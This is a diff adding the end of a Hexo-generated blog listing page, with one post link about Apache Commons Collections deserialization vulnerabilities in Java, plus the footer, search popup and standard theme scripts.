+        <span><i class="fas fa-history"></i>&nbsp;<span class="home-article-date" data-date="Wed Feb 03 2016 21:00:00 GMT+0800">2016-02-03</span></span>
+        
+            <span class="home-article-category"><i class="fas fa-folder"></i>&nbsp;
+                <ul>
+                    
+                        <li>
+                            
+                            <a href="/categories/JAVA%E5%AE%89%E5%85%A8/">JAVA安全</a>&nbsp;
+                        </li>
+                    
+                    
+                </ul>
+            </span>
+        
+        
+            <span class="home-article-tag">
+                <i class="fas fa-tags"></i>&nbsp;
+                <ul>
+                    
+                        <li>
+                            
+                            <a href="/tags/JAVA/">JAVA</a>&nbsp;
+                        </li>
+                    
+                </ul>
+            </span>
+        
+    </div>
+
+    <a href="/JAVA%20Apache-CommonsCollections%20Unserialize%20Vulnerabilities/">Read more&nbsp;<i class="fas fa-angle-right"></i></a>
+</div>
+
+            </li>
+        
+    </ul>
+
+    <div class="home-paginator">
+        <div class="paginator">
+    
+        <a class="prev btn"
+           href="/page/10/"
+        >Prev</a>
+    
+
+    
+</div>
+
+    </div>
+</div>
+
+
+                
+            </div>
+
+        </div>
+
+        <div class="page-main-content-bottom">
+            <footer class="footer">
+    <div class="info-container">
+        <div class="copyright-info info-item">
+            &copy;
+            
+              <span>2016</span>&nbsp;-&nbsp;
+            
+            2024&nbsp;<i class="fas fa-heart icon-animate"></i>&nbsp;<a target="_blank" rel="noopener" href="//langu.xyz">AboutME:langu_xyz</a>
+        </div>
+        <!--
+            <script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+            <div class="website-count info-item">
+                
+                    <span id="busuanzi_container_site_uv">
+                        Visitor Count&nbsp;<span id="busuanzi_value_site_uv"></span>&ensp;
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv">
+                        Totalview&nbsp;<span id="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        -->
+        <div class="theme-info info-item">
+            Powered by <a target="_blank" href="https://hexo.io">Hexo</a>&nbsp;|&nbsp;Theme&nbsp;<a class="theme-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep v3.4.3</a>
+        </div>
+        
+    </div>
+</footer>
+
+        </div>
+    </div>
+
+    
+
+    <div class="right-bottom-side-tools">
+        <div class="side-tools-container">
+    <ul class="side-tools-list">
+        <li class="tools-item tool-font-adjust-plus flex-center">
+            <i class="fas fa-search-plus"></i>
+        </li>
+
+        <li class="tools-item tool-font-adjust-minus flex-center">
+            <i class="fas fa-search-minus"></i>
+        </li>
+
+        <li class="tools-item tool-expand-width flex-center">
+            <i class="fas fa-arrows-alt-h"></i>
+        </li>
+
+        <li class="tools-item tool-dark-light-toggle flex-center">
+            <i class="fas fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+            <li class="tools-item rss flex-center">
+                <a class="flex-center"
+                   href="/atom.xml"
+                   target="_blank"
+                >
+                    <i class="fas fa-rss"></i>
+                </a>
+            </li>
+        
+
+        
+            <li class="tools-item tool-scroll-to-top flex-center">
+                <i class="fas fa-arrow-up"></i>
+            </li>
+        
+
+        <li class="tools-item tool-scroll-to-bottom flex-center">
+            <i class="fas fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="exposed-tools-list">
+        <li class="tools-item tool-toggle-show flex-center">
+            <i class="fas fa-cog fa-spin"></i>
+        </li>
+        
+    </ul>
+</div>
+
+    </div>
+
+    
+
+    <div class="image-viewer-container">
+    <img src="">
+</div>
+
+
+    
+        <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+          <span class="search-input-field-pre">
+            <i class="fas fa-keyboard"></i>
+          </span>
+            <div class="search-input-container">
+                <input autocomplete="off"
+                       autocorrect="off"
+                       autocapitalize="off"
+                       placeholder="Search..."
+                       spellcheck="false"
+                       type="search"
+                       class="search-input"
+                >
+            </div>
+            <span class="popup-btn-close">
+                <i class="fas fa-times"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+
+</main>
+
+
+
+
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/main.js"></script>
+
+<script src="/js/header-shrink.js"></script>
+
+<script src="/js/back2top.js"></script>
+
+<script src="/js/dark-light-toggle.js"></script>
+
+
+
+    
+<script src="/js/local-search.js"></script>
+
+
+
+
+    
+<script src="/js/code-copy.js"></script>
+
+
+
+
+    
+<script src="/js/lazyload.js"></script>
+
+
+
+<div class="post-scripts pjax">
+    
+</div>
+
+
+    
+<script src="/js/libs/pjax.min.js"></script>
+
+<script>
+    window.addEventListener('DOMContentLoaded', () => {
+        window.pjax = new Pjax({
+            selectors: [
+                'head title',
+                '.page-container',
+                '.pjax'
+            ],
+            history: true,
+            debug: false,
+            cacheBust: false,
+            timeout: 0,
+            analytics: false,
+            currentUrlFullReload: false,
+            scrollRestoration: false,
+            // scrollTo: true,
+        });
+
+        document.addEventListener('pjax:send', () => {
+            KEEP.utils.pjaxProgressBarStart();
+        });
+
+        document.addEventListener('pjax:complete', () => {
+            KEEP.utils.pjaxProgressBarEnd();
+            window.pjax.executeScripts(document.querySelectorAll('script[data-pjax], .pjax script'));
+            KEEP.refresh();
+        });
+    });
+</script>
+
+
+
+</body>
+</html>
